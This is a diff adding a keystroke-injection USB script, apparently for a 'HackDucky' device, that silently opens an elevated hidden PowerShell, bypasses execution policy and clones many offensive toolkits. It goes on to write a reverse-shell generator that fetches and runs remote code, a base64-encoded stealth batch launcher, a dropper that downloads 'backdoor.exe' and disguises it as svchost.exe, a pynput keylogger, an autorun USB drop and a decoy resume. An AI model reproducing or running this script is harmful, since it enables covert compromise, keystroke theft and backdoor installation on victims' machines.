@@ -1,0 +1,156 @@
+REM ======== HackDucky Script: payload_generator.txt ========
+REM Author: Devaansh Pathak
+REM Purpose: Stealthily sets up a powerful payload-building lab w/ GitHub tools, encoded PowerShell loaders, USB attack prep, and automation
+
+REM === STEP 1: Open Admin PowerShell Silently ===
+DELAY 1000
+GUI r
+DELAY 300
+STRING powershell -windowstyle hidden -Command "Start-Process powershell -ArgumentList '-windowstyle hidden' -Verb runAs"
+ENTER
+DELAY 3000
+ALT y
+DELAY 2000
+
+REM === STEP 2: Bypass Execution Policy Silently ===
+STRING powershell -windowstyle hidden -Command "Set-ExecutionPolicy Bypass -Scope Process -Force"
+ENTER
+
+REM === STEP 3: Install Chocolatey & Essentials (Silent) ===
+STRING powershell -windowstyle hidden -Command "[System.Net.ServicePointManager]::SecurityProtocol = 'Tls12'; iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))"
+ENTER
+DELAY 15000
+STRING choco install git python3 7zip.install nmap wireshark -y
+ENTER
+DELAY 60000
+
+REM === STEP 4: Create Payload Workspace ===
+STRING mkdir C:\Payloads\{Repos,Launchers,Keyloggers,Decoy,Obfuscators,USBDrop,BatchGens,Reports}
+ENTER
+
+REM === STEP 5: Clone Offensive GitHub Repos ===
+STRING cd C:\Payloads\Repos
+ENTER
+STRING git clone https://github.com/Veil-Framework/Veil.git
+ENTER
+STRING git clone https://github.com/swisskyrepo/PayloadsAllTheThings.git
+ENTER
+STRING git clone https://github.com/r00t-3xp10it/FUD-Tools.git
+ENTER
+STRING git clone https://github.com/trustedsec/unicorn.git
+ENTER
+STRING git clone https://github.com/PowerShellMafia/PowerSploit.git
+ENTER
+STRING git clone https://github.com/EmpireProject/Empire.git
+ENTER
+STRING git clone https://github.com/optiv/ScareCrow.git
+ENTER
+STRING git clone https://github.com/Flangvik/SharpCollection.git
+ENTER
+STRING git clone https://github.com/SigmaHQ/sigma.git
+ENTER
+STRING git clone https://github.com/Cn33liz/p0wnedShell.git
+ENTER
+STRING git clone https://github.com/LordNoteworthy/al-khaser.git
+ENTER
+STRING git clone https://github.com/byt3bl33d3r/CrackMapExec.git
+ENTER
+STRING git clone https://github.com/Screetsec/TheFatRat.git
+ENTER
+STRING git clone https://github.com/0xZDH/powerZure.git
+ENTER
+STRING git clone https://github.com/Inplex-sys/SharpHide.git
+ENTER
+STRING git clone https://github.com/tennc/webshell.git
+ENTER
+STRING git clone https://github.com/D4Vinci/One-Lin3r.git
+ENTER
+STRING git clone https://github.com/nettitude/PoshC2.git
+ENTER
+STRING git clone https://github.com/FortyNorthSecurity/Egregor.git
+ENTER
+STRING git clone https://github.com/itm4n/PrivescCheck.git
+ENTER
+STRING git clone https://github.com/hfiref0x/UACME.git
+ENTER
+STRING git clone https://github.com/PowerShellEmpire/PowerTools.git
+ENTER
+DELAY 70000
+
+REM === STEP 6: Build Reverse Shell Generator ===
+STRING echo import os > C:\Payloads\payload_builder.py
+ENTER
+STRING echo lhost = '127.0.0.1' >> C:\Payloads\payload_builder.py
+ENTER
+STRING echo lport = '4444' >> C:\Payloads\payload_builder.py
+ENTER
+STRING echo shell = f"powershell -nop -w hidden -c \\\"IEX(New-Object Net.WebClient).DownloadString('http://{lhost}:{lport}/rev.ps1')\\\"" >> C:\Payloads\payload_builder.py
+ENTER
+STRING echo with open('reverse.ps1','w') as f: f.write(shell) >> C:\Payloads\payload_builder.py
+ENTER
+STRING echo print('Reverse shell created as reverse.ps1') >> C:\Payloads\payload_builder.py
+ENTER
+
+REM === STEP 7: Encode Payload in Base64 ===
+STRING powershell -windowstyle hidden -Command "$b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes((Get-Content reverse.ps1 -Raw))); Set-Content reverse_encoded.b64 $b64"
+ENTER
+
+REM === STEP 8: Auto-Batch File Payload Creator ===
+STRING echo echo off > C:\Payloads\BatchGens\stealth_payload.bat
+ENTER
+STRING echo powershell -enc (Get-Content C:\Payloads\reverse_encoded.b64) >> C:\Payloads\BatchGens\stealth_payload.bat
+ENTER
+
+REM === STEP 9: PowerShell Dropper ===
+STRING echo $wc = New-Object System.Net.WebClient > C:\Payloads\Launchers\ps_downloader.ps1
+ENTER
+STRING echo $wc.DownloadFile('http://example.com/backdoor.exe','C:\Users\Public\svchost.exe') >> C:\Payloads\Launchers\ps_downloader.ps1
+ENTER
+STRING echo Start-Process 'C:\Users\Public\svchost.exe' >> C:\Payloads\Launchers\ps_downloader.ps1
+ENTER
+
+REM === STEP 10: Python Keylogger (Stealth) ===
+STRING echo from pynput.keyboard import Listener > C:\Payloads\Keyloggers\kl.py
+ENTER
+STRING echo def log(key): >> C:\Payloads\Keyloggers\kl.py
+ENTER
+STRING echo.    with open("klog.txt", "a") as f: f.write(str(key)+"\n") >> C:\Payloads\Keyloggers\kl.py
+ENTER
+STRING echo with Listener(on_press=log) as l: l.join() >> C:\Payloads\Keyloggers\kl.py
+ENTER
+
+REM === STEP 11: Desktop Launcher Shortcuts ===
+STRING echo @echo off > %USERPROFILE%\Desktop\Builder.bat
+ENTER
+STRING echo python C:\Payloads\payload_builder.py >> %USERPROFILE%\Desktop\Builder.bat
+ENTER
+STRING echo @echo off > %USERPROFILE%\Desktop\Keylog.bat
+ENTER
+STRING echo python C:\Payloads\Keyloggers\kl.py >> %USERPROFILE%\Desktop\Keylog.bat
+ENTER
+
+REM === STEP 12: Obfuscation Tools ===
+STRING echo Set-Alias -Name crypt -Value "[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes((Get-Content .\rev.ps1 -Raw)))" > C:\Payloads\Obfuscators\obfuscate.ps1
+ENTER
+
+REM === STEP 13: Simulated USB Drop Folder ===
+STRING mkdir C:\Payloads\USBDrop\autorun
+ENTER
+STRING echo [autorun] > C:\Payloads\USBDrop\autorun.inf
+ENTER
+STRING echo open=stealth_payload.bat >> C:\Payloads\USBDrop\autorun.inf
+ENTER
+STRING copy C:\Payloads\BatchGens\stealth_payload.bat C:\Payloads\USBDrop\autorun\stealth_payload.bat
+ENTER
+
+REM === STEP 14: Drop Decoy Resume ===
+STRING powershell -windowstyle hidden -Command "Invoke-WebRequest -Uri 'https://example.com/resume.pdf' -OutFile 'C:\Payloads\Decoy\resume.pdf'"
+ENTER
+STRING copy C:\Payloads\Decoy\resume.pdf %USERPROFILE%\Documents\CV2025.pdf
+ENTER
+
+REM === STEP 15: Final Status Message ===
+STRING echo "✅ HackDucky Payload Lab Ready: C:\Payloads"
+ENTER
+
+REM === END OF SCRIPT ===
